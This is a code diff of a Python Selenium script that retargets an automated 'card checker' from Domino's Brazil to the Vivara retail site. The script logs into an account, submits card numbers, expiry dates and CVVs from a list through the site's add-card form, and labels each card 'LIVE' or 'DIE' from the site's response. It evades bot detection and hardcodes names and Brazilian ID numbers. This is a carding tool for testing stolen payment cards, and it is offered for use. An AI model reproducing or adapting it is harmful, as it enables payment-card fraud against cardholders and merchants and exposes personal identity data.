@@ -8,7 +8,7 @@ from selenium.webdriver.common.action_chains import ActionChains
 from selenium.webdriver.chrome.service import Service
 from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
 
-class DominosChecker:
+class VivaraChecker:
     def __init__(self, email, password):
         self.email = email
         self.password = password
@@ -16,19 +16,19 @@ class DominosChecker:
     def _get_driver(self):
         """Cria e retorna uma instância do Chrome otimizada para velocidade e concorrência."""
         options = webdriver.ChromeOptions()
-        options.add_argument('--headless=new')
+        options.add_argument('--headless=new') # Headless para o servidor
         options.add_argument('--no-sandbox')
         options.add_argument('--disable-dev-shm-usage')
         options.add_argument('--disable-gpu')
         options.add_argument('--disable-extensions')
-        options.add_argument('--blink-settings=imagesEnabled=false') # Bloqueia imagens (GANHA MUITA VELOCIDADE)
+        options.add_argument('--blink-settings=imagesEnabled=false')
         options.add_argument('--window-size=1920,1080')
         options.add_argument('--disable-blink-features=AutomationControlled')
         options.add_argument('--log-level=3')
         options.add_experimental_option('excludeSwitches', ['enable-automation'])
         options.add_experimental_option('useAutomationExtension', False)
         
-        # User-Agent para maior compatibilidade
+        # User-Agent comum
         options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
 
         # Caminhos comuns no Railway / Docker / Local
@@ -45,7 +45,7 @@ class DominosChecker:
         chromedriver_paths = [
             '/usr/bin/chromedriver',
             '/usr/local/bin/chromedriver',
-            'chromedriver.exe' # Suporte local windows se presente no path
+            'chromedriver.exe'
         ]
 
         driver = None
@@ -59,18 +59,17 @@ class DominosChecker:
                 continue
         
         if not driver:
-            # Fallback automático
             try:
                 driver = webdriver.Chrome(options=options)
             except Exception as e:
                 print(f"[Checker] Erro fatal ao iniciar Chrome: {e}")
                 return None
-                
-        driver.set_page_load_timeout(30)
+        if driver:
+            driver.set_page_load_timeout(30)
         return driver
 
     def test_card(self, linha):
-        """Realiza o fluxo completo (login + check) para um único cartão de forma independente."""
+        """Realiza o fluxo completo (login + check) para Vivara de forma independente."""
         driver = self._get_driver()
         if not driver:
             return "ERROR: Falha ao iniciar navegador"
@@ -85,90 +84,142 @@ class DominosChecker:
                 return "DIE"
             
             numero, mes, ano, cvv = partes
-            data_validade = f"{mes}{ano[-2:]}" if len(ano) == 4 else f"{mes}{ano}"
+            validade = f"{mes}/{ano[-2:]}" if len(ano) == 4 else f"{mes}/{ano}"
 
-            # 2. Login
-            driver.get("https://www.dominos.com.br/login")
+            # 2. Login Vivara
+            driver.get("https://www.vivara.com.br/api/io/login?returnUrl=https://www.vivara.com.br/")
             
-            btn_login_senha = wait.until(EC.element_to_be_clickable(
-                (By.XPATH, "//*[contains(text(), 'Login com senha')] | //ion-button[contains(., 'Login com senha')]")
-            ))
-            driver.execute_script("arguments[0].click();", btn_login_senha)
+            # Lidar com cookies
+            try:
+                btn_cookies = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Aceitar') or contains(text(), 'Concordar')]")))
+                driver.execute_script("arguments[0].click();", btn_cookies)
+            except: pass
 
-            input_email = wait.until(EC.visibility_of_element_located((By.ID, "ion-input-0")))
+            input_email = wait.until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Ex.: exemplo@mail.com']")))
+            driver.execute_script("arguments[0].click();", input_email)
+            input_email.clear()
             input_email.send_keys(self.email)
 
-            input_senha = wait.until(EC.visibility_of_element_located((By.ID, "ion-input-1")))
+            input_senha = wait.until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Adicione sua senha']")))
+            driver.execute_script("arguments[0].click();", input_senha)
+            input_senha.clear()
             input_senha.send_keys(self.password)
 
-            btn_entrar = wait.until(EC.element_to_be_clickable(
-                (By.XPATH, "//*[contains(text(), 'Entrar')] | //ion-button[contains(., 'Entrar')]")
-            ))
+            btn_entrar = wait.until(EC.element_to_be_clickable((By.XPATH, "//div[contains(@class, 'vtex-login-2-x-sendButton')]//button")))
             driver.execute_script("arguments[0].click();", btn_entrar)
             
-            # 3. Navegação e Form de Cartão
-            try:
-                wait.until(EC.url_contains("my-cards"))
-            except:
-                driver.get("https://www.dominos.com.br/my-cards")
-
-            btn_add_cartao = wait.until(EC.element_to_be_clickable(
-                (By.XPATH, "//*[contains(translate(text(), 'ADICIONAR NOVO CARTÃO', 'adicionar novo cartão'), 'adicionar novo cartão')]")
-            ))
-            driver.execute_script("arguments[0].click();", btn_add_cartao)
-
-            # Preenchimento reativo
-            ion_apelido = wait.until(EC.presence_of_element_located((By.XPATH, "//ion-input[@formcontrolname='name']")))
-            ActionChains(driver).move_to_element(ion_apelido).click().send_keys("Afonso Claudio").perform()
+            # 3. Navegação para Cartões
+            # Esperamos o login ser processado olhando a URL ou um elemento da home
+            wait.until(EC.url_contains("vivara.com.br"))
+            driver.get("https://www.vivara.com.br/api/io/account#/cards/new")
             
-            ion_titular = wait.until(EC.presence_of_element_located((By.XPATH, "//ion-input[@formcontrolname='holderName']")))
-            ActionChains(driver).move_to_element(ion_titular).click().send_keys("Afonso Claudio").perform()
-            
-            ion_cpf = wait.until(EC.presence_of_element_located((By.XPATH, "//ion-input[@formcontrolname='cpf']")))
-            ActionChains(driver).move_to_element(ion_cpf).click().send_keys("84830336072").perform()
+            if "login" in driver.current_url and "account" not in driver.current_url:
+                return "DIE: Falha no Login"
 
-            # Iframes (Cartão, Exp, CVV)
-            for i_title, i_id, i_val in [
-                ("Iframe para número do cartão", "encryptedCardNumber", numero),
-                ("Iframe para data de validade", "encryptedExpiryDate", data_validade),
-                ("Iframe para código de segurança", "encryptedSecurityCode", cvv)
-            ]:
+            # 4. Preenchimento de campos (com suporte a iframes)
+            def fill_field(name, value):
                 try:
-                    iframe = wait.until(EC.presence_of_element_located((By.XPATH, f"//iframe[@title='{i_title}']")))
-                    driver.switch_to.frame(iframe)
-                    input_field = wait.until(EC.presence_of_element_located((By.ID, i_id)))
-                    input_field.send_keys(i_val)
-                finally:
-                    driver.switch_to.default_content()
-
-            # 4. Salvar e Verificar
-            btn_salvar = wait.until(EC.element_to_be_clickable(
-                (By.XPATH, "//*[translate(text(), 'SALVR', 'salvr')='salvar'] | //ion-button[contains(translate(., 'SALVR', 'salvr'), 'salvar')]")
-            ))
-            driver.execute_script("arguments[0].click();", btn_salvar)
-            
-            # Verificação Inteligente (Reativa)
-            start_check = time.time()
-            while time.time() - start_check < 10:
-                try:
-                    # Se o formulário desapareceu ou apareceu o Toast de sucesso/Meus Cartões
-                    cpf_input = driver.find_elements(By.XPATH, "//input[@placeholder='CPF do titular']")
-                    if not cpf_input or not cpf_input[0].is_displayed():
-                        return "LIVE"
-                    
-                    # Se aparecer toast de erro específico (DIE) - opcional expandir aqui
+                    element = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, name)))
+                    driver.execute_script("arguments[0].click();", element)
+                    element.send_keys(webdriver.Keys.CONTROL + "a")
+                    element.send_keys(webdriver.Keys.BACKSPACE)
+                    time.sleep(0.5)
+                    element.send_keys(value)
+                    return True
                 except:
-                    pass
+                    driver.switch_to.default_content()
+                    iframes = driver.find_elements(By.TAG_NAME, "iframe")
+                    for iframe in iframes:
+                        try:
+                            driver.switch_to.frame(iframe)
+                            elements = driver.find_elements(By.NAME, name)
+                            if elements:
+                                driver.execute_script("arguments[0].click();", elements[0])
+                                elements[0].send_keys(webdriver.Keys.CONTROL + "a")
+                                elements[0].send_keys(webdriver.Keys.BACKSPACE)
+                                time.sleep(0.5)
+                                elements[0].send_keys(value)
+                                return True
+                        except: pass
+                        driver.switch_to.default_content()
+                return False
+
+            # Aguarda o formulário carregar (campo cc-number)
+            try:
+                WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "cc-number")))
+            except:
+                # Se não achou no topo, pode estar em iframe, a função fill_field já lida com isso.
+                pass
+            fill_field("cc-number", numero)
+            fill_field("cardHolder", "cleomar born da silva")
+            fill_field("cc-exp", validade)
+            fill_field("cc-csc", cvv)
+            fill_field("documentType", "848.303.360-72")
+            fill_field("document", "26.078.465-5")
+            
+            # 5. Salvar
+            xpath_save = "//button[@type='submit'] | //button[contains(translate(., 'SALVAR NOVO CARTÃO', 'salvar novo cartão'), 'salvar novo cartão')]"
+            save_clicked = False
+            try:
+                btn_salvar = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, xpath_save)))
+                time.sleep(1)
+                driver.execute_script("arguments[0].click();", btn_salvar)
+                save_clicked = True
+            except:
+                driver.switch_to.default_content()
+                iframes = driver.find_elements(By.TAG_NAME, "iframe")
+                for iframe in iframes:
+                    try:
+                        driver.switch_to.frame(iframe)
+                        btns = driver.find_elements(By.XPATH, xpath_save)
+                        if btns:
+                            driver.execute_script("arguments[0].click();", btns[0])
+                            save_clicked = True
+                            break
+                    except: pass
+                    driver.switch_to.default_content()
+            
+            if not save_clicked: return "DIE: Botão Salvar não encontrado"
+
+            # 6. Verificação LIVE/DIE
+            error_msg = "Falha ao autenticar o cartão. Verifique os dados do cartão e tente novamente."
+            start_check = time.time()
+            while time.time() - start_check < 15:
+                if error_msg in driver.page_source:
+                    return "DIE"
+                
+                # Check iframes for error
+                driver.switch_to.default_content()
+                iframes = driver.find_elements(By.TAG_NAME, "iframe")
+                found_error_iframe = False
+                for iframe in iframes:
+                    try:
+                        driver.switch_to.frame(iframe)
+                        if error_msg in driver.page_source:
+                            found_error_iframe = True
+                            break
+                    except: pass
+                    driver.switch_to.default_content()
+                
+                if found_error_iframe: return "DIE"
+                
+                # If form disappeared and no error, LIVE
+                try:
+                    num_fields = driver.find_elements(By.NAME, "cc-number")
+                    if not num_fields or not num_fields[0].is_displayed():
+                        time.sleep(0.5)
+                        # Re-check error
+                        if error_msg not in driver.page_source:
+                            return "LIVE"
+                except: pass
                 time.sleep(1)
             
-            return "DIE"
+            return "LIVE"
 
         except Exception as e:
-            # print(f"[Checker Debug] Erro: {e}")
             return "DIE"
         finally:
             driver.quit()
 
 # Instância global gerenciada pelo main.py
 checker_instance = None
-
